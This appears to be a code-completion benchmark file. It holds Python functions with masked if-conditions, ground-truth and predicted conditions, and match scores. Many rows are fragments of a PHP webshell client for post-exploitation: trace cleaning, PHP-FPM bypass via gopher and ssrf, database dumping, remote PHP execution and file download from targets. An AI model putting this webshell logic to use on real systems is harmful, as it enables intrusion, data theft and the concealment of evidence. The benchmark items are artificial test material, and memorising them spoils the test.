"def CloudBasedTraining(training): training.get_models() 'Downloads the models from the URLs received, saves and loads them from the filesystem to Tensorflow models' consumer = KafkaConsumer(training.control_topic, bootstrap_servers=training.bootstrap_servers, auto_offset_reset='earliest', enable_auto_commit=False) 'Starts a Kafka consumer to receive the datasource information from the control topic' logging.info('Created and connected Kafka consumer for control topic') datasource_received = False while datasource_received is False: 'Loop until a datasource is received' msg = next(consumer) 'Gets a new message from Kafka control topic' logging.info('Message received in control topic') logging.info(msg) try: ok_training = False data = None if: received_deployment_id = int.from_bytes(msg.key, byteorder='big') if received_deployment_id == training.deployment_id: 'Whether the deployment ID received matches the received in this task, then it is a datasource for this task.' data = json.loads(msg.value) ""Data received from Kafka control topic. Data is a JSON with this format:\n dic={\n 'topic': ..,\n 'input_format': ..,\n 'input_config' : ..,\n 'description': ..,\n 'validation_rate' : ..,\n 'total_msg': ..\n }\n "" kafka_topic = data['topic'] logging.info('Received control confirmation of data from Kafka for deployment ID %s. Ready to receive data from topic %s with batch %d', training.deployment_id, str(kafka_topic), training.batch) if training.unsupervised: if data['unsupervised_topic'] is not None: unsupervised = True unsupervised_kafka_topic = data['unsupervised_topic'] logging.info('Also received unsupervised topic %s for unlabeled data', str(unsupervised_kafka_topic)) else: unsupervised = False logging.info('User deployed semi-supervised training but no unsupervised topic was received for unlabeled data. Performing standard supervised training with labeled data.') else: unsupervised = False logging.info('User deployed supervised training with labeled data.') decoder = DecoderFactory.get_decoder(data['input_format'], data['input_config",msg.key is not None,msg is not None,0.0,38.75385825373298
"def __init__(self): """"""Loads the environment information"""""" self.bootstrap_servers = os.environ.get('BOOTSTRAP_SERVERS') self.result_url = os.environ.get('RESULT_URL') self.result_id = os.environ.get('RESULT_ID') self.control_topic = os.environ.get('CONTROL_TOPIC') self.deployment_id = int(os.environ.get('DEPLOYMENT_ID')) self.batch = int(os.environ.get('BATCH')) self.kwargs_fit = json.loads(os.environ.get('KWARGS_FIT').replace(""'"", '""')) self.kwargs_val = json.loads(os.environ.get('KWARGS_VAL').replace(""'"", '""')) self.confussion_matrix = json.loads(os.environ.get('CONF_MAT_CONFIG').replace(""'"", '""')) self.model = None self.tensorflow_models = None self.unsupervised = eval(os.environ.get('UNSUPERVISED')) if: self.unsupervised_rounds = int(os.environ.get('UNSUPERVISED_ROUNDS')) self.confidence = eval(os.environ.get('CONFIDENCE')) logging.info('Received main environment information (bootstrap_servers, result_url, result_id, control_topic, deployment_id, batch, kwargs_fit, kwargs_val, unsupervised_training) ([%s], [%s], [%s], [%s], [%d], [%d], [%s], [%s], [%s])', self.bootstrap_servers, str(self.result_url), str(self.result_id), self.control_topic, self.deployment_id, self.batch, str(self.kwargs_fit), str(self.kwargs_val), str(self.unsupervised))",self.unsupervised,'UNSUPERVISED_ROUNDS' in os.environ,0.0,6.567274736060395
"def split_online_dataset(self, validation_rate, kafka_dataset): """"""Splits the online dataset for training and validation"""""" training_size = int((1 - validation_rate) * len(kafka_dataset)) validation_size = int(validation_rate * len(kafka_dataset)) logging.info('Training batch size %d and validation batch size %d', training_size, validation_size) train_dataset = kafka_dataset.take(training_size) 'Splits dataset for training' if: validation_dataset = kafka_dataset.skip(training_size) else: 'If no validation is greater than 0, then split the dataset for training' validation_dataset = None splits = {'train_dataset': train_dataset, 'validation_dataset': validation_dataset} return splits",validation_size > 0,validation_size > 0,1.0,100.00000000000004
"def train_classic_semi_supervised_model(self, splits, unsupervised_kafka_dataset, callback): """"""Trains semi-supervised model"""""" x_train = np.concatenate([x for x, y in splits['train_dataset']], axis=0) y_train = np.concatenate([y for x, y in splits['train_dataset']], axis=0) x_val = np.concatenate([x for x, y in splits['validation_dataset']], axis=0) y_val = np.concatenate([y for x, y in splits['validation_dataset']], axis=0) logging.info('Training model with labeled data') if: model_trained = self.model.fit(x=x_train, y=y_train, validation_data=(x_val, y_val), **self.kwargs_fit, callbacks=[callback]) else: y_training = [] y_validation = [] for i in range(self.N): y_training.append(y_train) y_validation.append(y_val) model_trained = self.model.fit(x=x_train, y=y_training, validation_data=(x_val, y_validation), **self.kwargs_fit, callbacks=[callback]) unsupervised_kafka_dataset = unsupervised_kafka_dataset.batch(self.batch) x_unlabeled = np.concatenate([x for x, y in unsupervised_kafka_dataset], axis=0) for round in range(self.unsupervised_rounds): if len(x_unlabeled) > 0: predictions = self.model.predict(x_unlabeled) if: confidence_scores = np.max(predictions, axis=1) pseudo_labels = np.argmax(predictions, axis=1) else: confidence_scores = np.max(predictions[-1], axis=1) pseudo_labels = np.argmax(predictions[-1], axis=1) high_confidence_indices = confidence_scores >= self.confidence high_confidence_pseudo_labels = pseudo_labels[high_confidence_indices] high_confidence_unlabeled_data = x_unlabeled[high_confidence_indices] if len(high_confidence_pseudo_labels","not hasattr(self, 'N')",round == 0,0.0,0.0
"def sendDistributedTempMetrics(self, train_metrics, val_metrics): """"""Send the metrics to the backend"""""" results_list = [] for i in range(len(self.tensorflow_models)): results = {'train_metrics': train_metrics[i], 'val_metrics': val_metrics[i]} results_list.append(results) new_urls = [] for url in self.result_url: new_urls.append(url.replace('results', 'results_metrics')) retry = 0 finished = False while not finished and retry < RETRIES: try: responses = [] for result, url in zip(results_list, new_urls): data = {'data': json.dumps(result)} logging.info('Sending result data to backend') r = requests.post(url, data=data) responses.append(r.status_code) if: finished = True logging.info('Metrics updated!') else: time.sleep(SLEEP_BETWEEN_REQUESTS) retry += 1 except Exception as e: traceback.print_exc() retry += 1 logging.error('Error sending the metrics to the backend [%s].', str(e)) time.sleep(SLEEP_BETWEEN_REQUESTS)",responses[0] == 200 and len(set(responses)) == 1,responses[0] == 200 and len(responses) == 1,0.0,70.95461077803648
"def sendDistributedMetrics(self, epoch_training_metrics, epoch_validation_metrics, test_metrics, dtime): """"""Sends distributed metrics to backend"""""" retry = 0 finished = False datasource_received = False start_sending_results = time.time() while not finished and retry < RETRIES: try: TRAINED_MODEL_PATHS = [] for i in range(1, len(self.tensorflow_models) + 1): path = 'trained_model_{}.h5'.format(i) TRAINED_MODEL_PATHS.append(path) for m, p in zip(self.tensorflow_models, TRAINED_MODEL_PATHS): m.save(p) 'Saves the trained models in the filesystem' files = [] for p in TRAINED_MODEL_PATHS: files_dic = {'trained_model': open(p, 'rb'), 'confussion_matrix': None} files.append(files_dic) if: indefinite = True else: indefinite = False results_list = [] for i in range(len(self.tensorflow_models)): results = {'train_metrics': epoch_training_metrics[i], 'val_metrics': epoch_validation_metrics[i], 'test_metrics': test_metrics[i] if test_metrics != [] else [], 'training_time': round(dtime, 4), 'confusion_matrix': None, 'indefinite': indefinite} results_list.append(results) responses = [] for result, url, f in zip(results_list, self.result_url, files): data = {'data': json.dumps(result)} logging.info('Sending result data to backend') r = requests.post(url, files=f, data=data) responses.append(r.status_code) 'Sends the training results to the backend' if responses[0] == 200 and len(set(responses)) == 1: finished = True datasource_received = True logging.info('Results data sent correctly to backend!!') else: time.sleep(SLEEP_BETWEEN_REQUESTS) retry += 1 except Exception as e: traceback.print_exc() retry += 1 logging.error('Error sending the result to the backend [%s].', str(e)) time.sleep(SLEEP",self.stream_timeout == -1,epoch_training_metrics[0] == epoch_validation_metrics[0],0.0,4.753622060013117
"def call_all(self, func_name: str, args: tuple): if: return None response_dict = {} for x in self.names(): try: func = getattr(self.get(x), func_name) response_dict[x] = func(*args) except Exception: continue return response_dict","not isinstance(args, tuple)",len(args) == 0,0.0,14.535768424205482
"def get_message(self, pluginName): if: return self.__message_dict[pluginName] return ''",pluginName in self.__message_dict,pluginName in self.__message_dict,1.0,100.00000000000004
"@alias(True, func_alias='?', o='order') def run(order: str=''): """""" help Output the help document for the command or all help menu. eg: help {order} """""" if: set_namespace(gget('namespace'), True, False) return tpf = None gpf = gget(f'general.pf') npf = gget(f""{gget('namespace')}.pf"") cpf = gget(f'custom.pf') order = order_alias(order) if order in npf: tpf = npf elif order in gpf: tpf = gpf elif order in cpf: tpf = cpf elif order: print('%s object is not command-function' % order) return api = gget('api') func = getattr(tpf[order], api) if func.__doc__: print(func.__doc__) block = ' ' * 4 block_two = block * 2 sig = inspect.signature(func) folders_namespace = gget('folders_namespace') func_folder, func_name = func.__module__.split('.') func_reverse_alias = gget('%s.reverse_alias' % func_name, folders_namespace[func_folder]) if len(sig.parameters): print('%sCommand Args:' % block) for k, v in sig.parameters.items(): arg = '--%s' % k if k in func_reverse_alias: arg = '-%s,%s' % (func_reverse_alias[k], arg) desc = str(v).split(':') if len(desc) > 1: desc = desc[1].split('=') if len(desc) > 1: desc = '[%s] %s (Default: %s)' % (desc[0].strip(), k, desc[1].strip()) else: desc = '[%s] %s' % (desc[0].strip(), k) arg = '%s(*)' % arg else: desc = '[?] %s' % desc[0] arg = '%s(?)' % arg print('%s%-25s%s%s\n' % (block_two, arg, block_two, desc))",order == '',order == 'namespace',0.0,59.460355750136046
"@alias(True) def run(filepath='log.txt'): """""" log (Only for *unix) Write input and output to the log. eg: log {filepath=""log.txt""} """""" if: print(color.red(""\nYour system isn't *unix\n"")) return filepath = path.abspath(filepath) dirpath = path.dirname(filepath) if not path.exists(dirpath): print(color.red('\nFile path is invalid\n')) return if access(dirpath, W_OK): print(color.green(f'\nSet log in {filepath}\n')) sys.stdout = Logger(filepath, sys.__stdout__) sys.stderr = Logger(filepath, sys.__stderr__) gset('log_filepath', filepath, True) gset('log_stdout', sys.stdout, True) gset('log_stderr', sys.stderr, True) else: print(color.red('\nFile path is invalid\n'))",is_windows(False),not is_windows(),0.0,53.7284965911771
"def size_to_human(num, suffix='B'): for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']: if: return '%3.1f %s%s' % (num, unit, suffix) num /= 1024.0 return '%.1f%s%s' % (num, 'Yi', suffix)",abs(num) < 1024.0,abs(num) < 1024.0,1.0,100.00000000000004
"def human_to_size(size): size = size.upper() if: size = sub('([KMGT]?B)', ' \\1', size) number, unit = [string.strip() for string in size.split()] return int(float(number) * UNITS[unit])","not match(' ', size)","isinstance(size, str)",0.0,8.22487964923291
"def clean_trace(): def get_clean_php(filename: str): system_clean_command = f'rm -f {filename} && echo success' return '$f=base64_decode(""%s"");\n if (!unlink($f)){\n %s\n }else{echo ""success"";}\n ' % (base64_encode(filename), get_system_code(system_clean_command)) ld_preload_filename = gget('webshell.ld_preload_path', 'webshell', None) udf_filename = gget('webshell.udf_path', 'webshell', None) iconv_filename = gget('webshell.iconv_path', 'webshell', None) iconv_gconv_modules_filename = gget('webshell.iconv_gconv_modules_path', 'webshell', None) clean_files = (ld_preload_filename, udf_filename, iconv_filename, iconv_gconv_modules_filename) for each in clean_files: if each: print(color.yellow('\nClean %s ...\n' % each)) res = send(get_clean_php(each)) if res: text = res.r_text.strip() if 'success' in text: print(color.green('Clean success\n')) else: print(color.red('Clean failed\n')) if: print(color.yellow('\nClean udf ...\n')) execute_sql_command(""delete from mysql.func where name='sys_eval';"") gset('webshell.ld_preload_path', None, True, 'webshell') gset('webshell.ld_preload_func', None, True, 'webshell') gset('webshell.iconv_path', None, True, 'webshell') gset('webshell.iconv_gconv_modules_path', None, True, 'webshell') gset('webshell.udf_path', None, True, 'webshell') gset('webshell.apache_mod_cgi', False, True, 'webshell') gset('db_dbms', '', True, 'webshell') gset('db_ext', '', True, 'webshell') gset('db_connect_type', '', True, 'webshell') g",udf_filename,udf_filename,1.0,0.0
"def fake_referer(): i = randint(1, 6) random_params = '' for _ in range(randint(4, 8)): random_params += f'{trush()}={trush()}&' random_params = random_params.strip('&') if: return f'https://www.google.{trush(2, 2)}/url?{random_params}' elif i == 2: return f'https://blog.csdn.net/{trush(5, 12)}/article/details/{randint(10000, 99999)}?{random_params}' elif i == 3: return f'https://www.baidu.com/?q={trush(2, 10)}&{random_params}' elif i == 4: return f'https://www.google.com/?q={trush(2, 10)}&{random_params}' elif i == 5: return f'https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}' elif i == 6: return f'https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}'",i == 1,i == 1,1.0,100.00000000000004
"def _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict): attack_type = gget('webshell.bdf_fpm.type', 'webshell') host = gget('webshell.bdf_fpm.host', 'webshell') port = gget('webshell.bdf_fpm.port', 'webshell') sock_path = gget('webshell.bdf_fpm.sock_path', 'webshell') php_file_path = gget('webshell.bdf_fpm.php_file_path', 'webshell') if: phpcode = get_php_fpm_eval(attack_type) % generate_ssrf_code_payload(host, port, phpcode, php_file_path) elif attack_type == 'sock': phpcode = get_php_fpm_eval(attack_type) % (sock_path, generate_base64_socks_code_payload(host, port, phpcode, php_file_path)) elif attack_type == 'http_sock': phpcode = get_php_fpm_eval(attack_type) % (host, port, generate_base64_socks_code_payload(host, port, phpcode, php_file_path)) elif attack_type == 'ftp': php_server_port = gget('webshell.bdf_fpm.php_server_port', 'webshell', False) random_ftp_port = randint(60000, 64000) if not php_server_port: random_php_server_port = random_ftp_port + randint(1, 1000) php_server_phpcode = get_system_code('php -n -t /tmp -S 0.0.0.0:%s' % random_php_server_port, False) params_dict[raw_key][password] = php_server_phpcode t = Thread(target=send, kwargs={'phpcode': php_server_phpcode, '_in_system_command': True}) t.setDaemon(True) t.start() gset('webshell.bdf_fpm.php_server_port', random_php_server_port, True, 'webshell') php",attack_type == 'gopher',attack_type == 'ssrf',0.0,75.98356856515926
"@alias(True) def run(timeout: float=2.0): """""" check Check if each webshell is alive. eg: check {timeout=2.0} """""" root_path = gget('root_path') log_path = path.join(root_path, 'webshell.log') if: print(color.red('No webshell.Log')) return 0 with open(log_path, 'r') as f: lines = f.readlines() for index, line in enumerate(lines, 1): data = line.strip().split('|') if len(data) < 3: continue url, method, pwd, *encode_functions = data if method == 'GET': raw_key = 'params' elif method == 'POST': raw_key = 'data' elif method == 'COOKIE': raw_key = 'cookies' elif method == 'HEADER': raw_key = 'headers' else: print(f""[{color.blue(str(index))}] {color.red('Method error')}"") continue check_value = randint(0, int(urandom(8).hex(), 16)) correct_value = md5(str(check_value).encode()).hexdigest() check_command = f""print(md5('{check_value}'));"" encode_pf = gget('encode.pf') for func in encode_functions: if func in encode_pf: check_command = encode_pf[func].run(check_command) params_dict = {raw_key: {pwd: check_command}, 'timeout': timeout} common_text, status_code_text = ('', '000') try: res = post(url, verify=False, **params_dict) status_code_text = str(res.status_code) if correct_value in res.text: common_text = color.green('Alive') else: common_text = color.red('Not Alive') except exceptions.Timeout: common_text = color.yellow('Timeout') except exceptions.RequestException: common_text = color.red('Request error') print(f'[{color.blue(str(index))}] [{color.yellow(status_code_text)}] {common_text} {url}')",not exists(log_path),not path.exists(log_path),0.0,61.04735835807847
"@alias(True, _type='OTHER', func_alias='ag', u='url', m='method', d='data', p='params', c='cookie', t='type', to='timeout', re_m='redirect_method') def run(url: str, method: str, data: str='', params: str='', cookie: str='', type: int=1, timeout: float=3, redirect_method: str='POST', redirect_auto: int=1, redirect_cookie_use: int=1, create_dir: int=0): """""" agent Lightweight intranet browsing. eg: agent {url} {method} {data=''} {params=''} {cookie=''} {type=[socket|file_get_contents|curl]{1|2|3},default = 1} {timeout=3} {redirect_method=POST} {redirect_auto=1} {redirect_cookie_use=1} {create_dir=0} """""" php = get_php_agent(url, method.upper(), redirect_method.upper(), data, params, cookie, redirect_auto, redirect_cookie_use, timeout, type) res = send(php) if: return text = res.r_text try: current_status = findall('<CurrentStatus>(.*)</CurrentStatus>', text, I + M) assert len(current_status), ""Can't get status```"" current_status = current_status[0] current_url = findall('<CurrentUrl>(.*)</CurrentUrl>', text, I + M) current_url = base64_decode(current_url[0]) if len(current_url) else '' current_cookie = findall('<CurrentCookie>(.*)</CurrentCookie>', text, I + M) current_cookie = base64_decode(current_cookie[0]) if len(current_cookie) else '' current_header = findall('<CurrentHeader>(.*)</CurrentHeader>', text, I + M) current_header = '\n '.join((base64_decode(line) for line in current_header[0].split('|'))) if len(current_header) else '' if current_status == 'success': print(color.magenta('Current Url: ') + color.cyan(current_url) + '\n') print(color.",not res,not res,1.0,0.0
"def set_mode(mode: int, test: bool=False): if: ext = mode_require_ext_dict[mode] res = send(get_detectd_ext(ext)) if not res: return False text = res.r_text.strip() if 'exist' not in text: print(color.red(f'\nNo {ext} extension\n')) return False if mode == 4 and (not gget('webshell.ld_preload_path', 'webshell', False)): if is_windows(): print(color.red('\nNo ld_preload function!\n')) return False disable_funcs = gget('webshell.disable_functions', 'webshell') if 'putenv' in disable_funcs: print(color.red('\nputenv is disabled\n')) return False if not gget('webshell.ld_preload_path', 'webshell', None): filename = '/tmp/%s.so' % str(uuid4()) available_trigger_funcs = ['mail', 'error_log', 'mb_send_mail'] trigger_funcs = [f for f in available_trigger_funcs if f not in disable_funcs] if not trigger_funcs: print(color.red('\nNo trigger function\n')) return False trigger_func = trigger_funcs[0] bits = gget('webshell.arch', namespace='webshell') if not bits: print('\nInput target system bits (32/64): ', end='') _ = readline().strip() if _ == '32': bits = 32 elif _ == '64': bits = 64 else: print(color.red('\nUnknown bits\n')) return False bits = str(bits) if bits == '32': bits = '86' upload_result = upload(path.join(gget('root_path'), 'auxiliary', 'ld_preload', 'ld_preload_x' + bits + '.so'), filename, True) if not upload_result: print(color.red('\nUpload error\n')) return gset('webshell.ld_preload_path', filename, True, 'webshell') gset('webshell.ld_preload_func', trigger_func, True, 'webshell') elif mode == 8: if gget('db_connected', '",mode in mode_require_ext_dict,mode in mode_require_ext_dict,1.0,100.00000000000004
"@alias(True, _type='DATABASE', t='table') def run(table: str): """""" db_columns Output all columns of a table. eg: db_columns {table} """""" if: print(color.red('Please run db_init command first')) return database = gget('db_dbname', 'webshell') print(execute_sql_command(f'show columns from {table};', database))","not gget('db_connected', 'webshell')","not gget('db_connected', 'webshell')",1.0,100.00000000000004
"def get_table_name_php(database): connect_type = gget('db_connect_type', 'webshell') if: return get_php_table_name(connect_type) % get_db_connect_code(dbname=database) elif connect_type == 'mysqli': return get_php_table_name(connect_type) % get_db_connect_code(dbname=database) else: return ''",connect_type == 'pdo',connect_type == 'mysql',0.0,75.98356856515926
"def get_table_row_number(database, table): connect_type = gget('db_connect_type', 'webshell') if: php = get_php_table_row_number(connect_type) % (get_db_connect_code(dbname=database), table) elif connect_type == 'mysqli': php = get_php_table_row_number(connect_type) % (get_db_connect_code(dbname=database), table) else: php = '' res = send(php) try: return int(res.r_text.strip()) except ValueError: return -1",connect_type == 'pdo',connect_type == 'mysql',0.0,75.98356856515926
"def get_table_construct(database, table, encoding): global REQUEST_LOCK connect_type = gget('db_connect_type', 'webshell') if: php = get_php_table_construct(connect_type) % (get_db_connect_code(dbname=database), table) elif connect_type == 'mysqli': php = get_php_table_construct(connect_type) % (get_db_connect_code(dbname=database), table) else: php = '' retry_time = 5 text = None while retry_time and (not text): with REQUEST_LOCK: res = send(php) try: text = gzinflate(b64decode(res.r_text.strip())) except Exception: text = None retry_time -= 1 return text if text else ''",connect_type == 'pdo',connect_type == 'mysql',0.0,75.98356856515926
"def get_data(index, database, table, encoding, offset, blocksize): global REQUEST_LOCK connect_type = gget('db_connect_type', 'webshell') if: php = get_php_data(connect_type) % (get_db_connect_code(dbname=database), table, offset, blocksize) elif connect_type == 'mysqli': php = get_php_data(connect_type) % (get_db_connect_code(dbname=database), table, offset, blocksize) else: php = '' retry_time = 5 text = None while retry_time and (not text): with REQUEST_LOCK: res = send(php) try: text = gzinflate(b64decode(res.r_text.strip())) except Exception: text = None retry_time -= 1 return (index, text if text else '')",connect_type == 'pdo',connect_type == 'webshell',0.0,75.98356856515926
"@alias(True, func_alias='exec', _type='SHELL') def run(editor: str='', edit_args: str=''): """""" execute execute Custom PHP code by notepad / vi as default or your own editor, edit_args split by space. eg: execute {editor=""""} {edit_args=""""} execute code '""--wait""' """""" file_name = str(uuid4()) + '.php' real_file_path = newfile(file_name) open_editor(real_file_path, editor, edit_args) with open(real_file_path, 'r') as f: code = f.read() if: code = code[5:] if code.endswith('?>'): code = code[:-2] print(color.yellow('Execute php code...')) res = send(code) if not res: return text = res.r_text.strip() status_code = color.green(str(res.status_code)) if res.status_code == 200 else color.yellow(str(res.status_code)) print(f""\n{color.green('Result:')}\n[{status_code}] {color.cyan('length')}: {len(text)} \n{text}\n"") remove(real_file_path)",code.startswith('<?php'),code.startswith('<'),0.0,62.401954419369176
"@alias(True, _type='DETECT', fp='web_file_path') def run(web_file_path: str='/var'): """""" fl Search log file (access.log,error.log) from target system. eg: fl {web_file_path=""/var""} """""" php = get_php(web_file_path) try: res = send(php) if: return file_tree = res.r_json() except JSONDecodeError: print(color.red('Parse Error')) return print_tree(web_file_path, file_tree)",not res,not res,1.0,0.0
"@alias(True, _type='FILE', w='web_file_path', l='local_path', s='humansize', t='threads') def run(web_file_path: str, local_path: str='', humansize: str='1MB', threads: int=5) -> bool: """""" mdownload Download file from target system by block compression and multi threads. eg: mdownload {web_file_path} {local_path=doughnuts/target/site.com/...} {humansize=""1MB"",eg=""10MB""} {threads=5} """""" global PRINT_LOCK, DOWNLOAD_SUCCESS, BAR, BLOCKSIZE, CHUNK_NAME_DICT res = send(get_filesize_php(web_file_path)) if: return try: file_size = int(res.r_text.strip()) print(color.green(f'Get file size: {size_to_human(file_size)}')) except ValueError: print(color.red(""\nCan't get file size\n"")) return res = send(get_filemd5_php(web_file_path)) if: return file_md5 = res.r_text.strip() print(color.green(f'Get file hash: {file_md5}')) if len(file_md5) != 32: print(color.red(""\nCan't sum file md5 hash\n"")) return try: blocksize = human_to_size(humansize) except Exception: blocksize = file_size // 10 print(color.yellow(f'Parse humansize error, set it to {size_to_human(blocksize)}')) if blocksize < file_size / 1000: blocksize = file_size // 100 print(color.yellow(f'Humansize too small, set it to {size_to_human(blocksize)}')) BLOCKSIZE = blocksize if file_size: file_name = path.split(web_file_path)[1] download_path = local_path or gget('webshell.download_path', 'webshell') download_path = download_path.replace('\\', '/') if not path.isdir(download_path): makedirs(download_path) file_path = path.join(download",not res,not res,1.0,0.0
"def update(future): global BAR, UPLOAD_SUCCESS, BLOCKSIZE, ALL_TASK, LOCK result = future.result() if: if not BAR.disable: with LOCK: BAR.update(BLOCKSIZE) else: UPLOAD_SUCCESS = False BAR.close() for task in reversed(ALL_TASK): task.cancel()",result,result is None or UPLOAD_SUCCESS,0.0,6.567274736060395
"@tensorrt_converter('torch.nn.Conv1d.forward') def convert_Conv1d(ctx): module = ctx.method_args[0] input = ctx.method_args[1] input_trt = trt_(ctx.network, input) output = ctx.method_return kernel_size = (module.kernel_size[0], 1) stride = (module.stride[0], 1) padding = (module.padding[0], 0) dilation = (module.dilation[0], 1) kernel = module.weight.detach().cpu().numpy()[..., None] bias = trt.Weights(torch_dtype_to_trt(module.weight.dtype)) if: bias = module.bias.detach().cpu().numpy() input_shape_trt = ctx.network.add_shape(input_trt).get_output(0) one_trt = trt_(ctx.network, torch.tensor([1], dtype=torch.int32).to(input.device)) new_input_shape_trt = ctx.network.add_concatenation([input_shape_trt, one_trt]).get_output(0) layer = ctx.network.add_shuffle(input_trt) layer.set_input(1, new_input_shape_trt) layer = ctx.network.add_convolution(input=layer.get_output(0), num_output_maps=module.out_channels, kernel_shape=kernel_size, kernel=kernel, bias=bias) layer.stride = stride layer.padding = padding layer.dilation = dilation if module.groups is not None: layer.num_groups = module.groups conv_out_trt = layer.get_output(0) out_shape_trt = ctx.network.add_shape(conv_out_trt).get_output(0) new_out_shape_trt = ctx.network.add_slice(out_shape_trt, [0], [3], [1]).get_output(0) layer = ctx.network.add_shuffle(conv_out_trt) layer.set_input(1, new_out_shape_trt) output._trt = layer",module.bias is not None,module.bias is not None,1.0,100.00000000000004
"@tensorrt_converter('torch.nn.ConvTranspose2d.forward') def convert_ConvTranspose2d(ctx): module = ctx.method_args[0] input = ctx.method_args[1] input_trt = trt_(ctx.network, input) output = ctx.method_return kernel_size = module.kernel_size if: kernel_size = (kernel_size,) * 2 stride = module.stride if not isinstance(stride, tuple): stride = (stride,) * 2 padding = module.padding if not isinstance(padding, tuple): padding = (padding,) * 2 kernel = module.weight.detach().cpu().numpy() bias = trt.Weights(torch_dtype_to_trt(module.weight.dtype)) if module.bias is not None: bias = module.bias.detach().cpu().numpy() layer = ctx.network.add_deconvolution(input=input_trt, num_output_maps=module.out_channels, kernel_shape=kernel_size, kernel=kernel, bias=bias) layer.stride = stride layer.padding = padding if module.groups is not None: layer.num_groups = module.groups output._trt = layer.get_output(0)","not isinstance(kernel_size, tuple)","not isinstance(kernel_size, tuple)",1.0,100.00000000000004
"@tensorrt_converter('torch.nn.LayerNorm.forward') def convert_LayerNorm(ctx): module = ctx.method_args[0] input = ctx.method_args[1] normalized_shape = module.normalized_shape weight = module.weight bias = module.bias eps = module.eps output = ctx.method_return eps_np = np.array([eps], dtype=np.float32) keep_dims = True input_trt = trt_(ctx.network, input) if: input_shape_trt = tensor_trt_get_shape_trt(ctx.network, input_trt) new_input_shape_trt = ctx.network.add_concatenation([trt_(ctx.network, 1), input_shape_trt]).get_output(0) layer = ctx.network.add_shuffle(input_trt) layer.set_input(1, new_input_shape_trt) input_trt = layer.get_output(0) reduce_axes = torch_dim_to_trt_axes(tuple(range(len(input_trt.shape) - len(normalized_shape), len(input_trt.shape)))) mean_trt = ctx.network.add_reduce(input_trt, trt.ReduceOperation.AVG, reduce_axes, keep_dims).get_output(0) delta_trt = ctx.network.add_elementwise(input_trt, mean_trt, trt.ElementWiseOperation.SUB).get_output(0) var_trt = ctx.network.add_scale(delta_trt, trt.ScaleMode.UNIFORM, np.zeros_like(eps_np), np.ones_like(eps_np), 2 * np.ones_like(eps_np)).get_output(0) var_trt = ctx.network.add_reduce(var_trt, trt.ReduceOperation.AVG, reduce_axes, keep_dims).get_output(0) var_trt = ctx.network.add_scale(var_trt, trt.ScaleMode.UNIFORM, eps_np, np.ones_like(eps_np), 0.5 * np.ones",len(input.shape) == 3,"isinstance(input_trt, torch.Tensor)",0.0,9.980099403873663
"@tensorrt_converter('torch.cumprod') @tensorrt_converter('torch.Tensor.cumprod') def convert_cumprod(ctx): old_args = ctx.method_args old_kwargs = ctx.method_kwargs input = ctx.method_args[0] dim = get_arg(ctx, 'dim', pos=1, default=0) cum_type = 1 if: dim = len(input.shape) + dim output = ctx.method_return if input.dtype == torch.bool or input.dtype == bool: cast_input = input.type_as(output) ctx.method_args = [input] ctx.method_kwargs = {} ctx.method_return = cast_input convert_type(ctx, torch_dtype_to_trt(output.dtype)) input_trt = trt_(ctx.network, cast_input) else: input_trt = trt_(ctx.network, input) plugin = create_torchcum_plugin('cumprod_' + str(id(input)), dim=dim, cum_type=cum_type) custom_layer = ctx.network.add_plugin_v2(inputs=[input_trt], plugin=plugin) output_trt = custom_layer.get_output(0) if input.dtype != output.dtype: tmp_output = output.clone() tmp_output._trt = output_trt ctx.method_args = [tmp_output] ctx.method_kwargs = {} ctx.method_return = output convert_type(ctx, torch_dtype_to_trt(output.dtype)) output_trt = ctx.method_return._trt output._trt = output_trt ctx.method_args = old_args ctx.method_kwargs = old_kwargs ctx.method_return = output",dim < 0,dim < 0,1.0,0.0
"def _reshape_1d2d3d(network, x_trt): x_shape_trt = network.add_shape(x_trt).get_output(0) y_trt = x_trt ndim = len(x_trt.shape) if: one_trt = trt_(network, 1) new_x_shape_trt = network.add_concatenation([x_shape_trt] + [one_trt] * (4 - ndim)).get_output(0) if ndim > 4: head_shape_trt = network.add_slice(x_shape_trt, [0], [3], [1]).get_output(0) tail_shape_trt = network.add_slice(x_shape_trt, [3], [1], [1]).get_output(0) for i in range(4, ndim): other_trt = network.add_slice(x_shape_trt, [i], [1], [1]).get_output(0) tail_shape_trt = network.add_elementwise(tail_shape_trt, other_trt, trt.ElementWiseOperation.PROD).get_output(0) new_x_shape_trt = network.add_concatenation([head_shape_trt, tail_shape_trt]).get_output(0) if ndim != 4: layer = network.add_shuffle(x_trt) layer.set_input(1, new_x_shape_trt) y_trt = layer.get_output(0) return (y_trt, x_shape_trt)",ndim < 4,ndim < 4,1.0,0.0
"def forward(self, x): align_corners = None if: align_corners = True return torch.nn.functional.interpolate(x, size=self.size, scale_factor=self.scale_factor, mode=self.mode, align_corners=align_corners)",self.mode != 'nearest',self.align_corners,0.0,17.491650626361256
"@tensorrt_converter('torch.nn.functional.max_pool2d') def convert_max_pool2d(ctx): input = get_arg(ctx, 'input', pos=0, default=None) kernel_size = get_arg(ctx, 'kernel_size', pos=1, default=None) stride = get_arg(ctx, 'stride', pos=2, default=None) padding = get_arg(ctx, 'padding', pos=3, default=0) ceil_mode = get_arg(ctx, 'ceil_mode', pos=5, default=False) input_trt = trt_(ctx.network, input) output = ctx.method_return if: kernel_size = (kernel_size,) * 2 if not isinstance(stride, tuple): stride = (stride,) * 2 if not isinstance(padding, tuple): padding = (padding,) * 2 layer = ctx.network.add_pooling_nd(input=input_trt, type=trt.PoolingType.MAX, window_size=kernel_size) layer.stride_nd = stride layer.padding_nd = padding if ceil_mode: layer.padding_mode = trt.PaddingMode.EXPLICIT_ROUND_UP output._trt = layer.get_output(0)","not isinstance(kernel_size, tuple)","not isinstance(kernel_size, tuple)",1.0,100.00000000000004
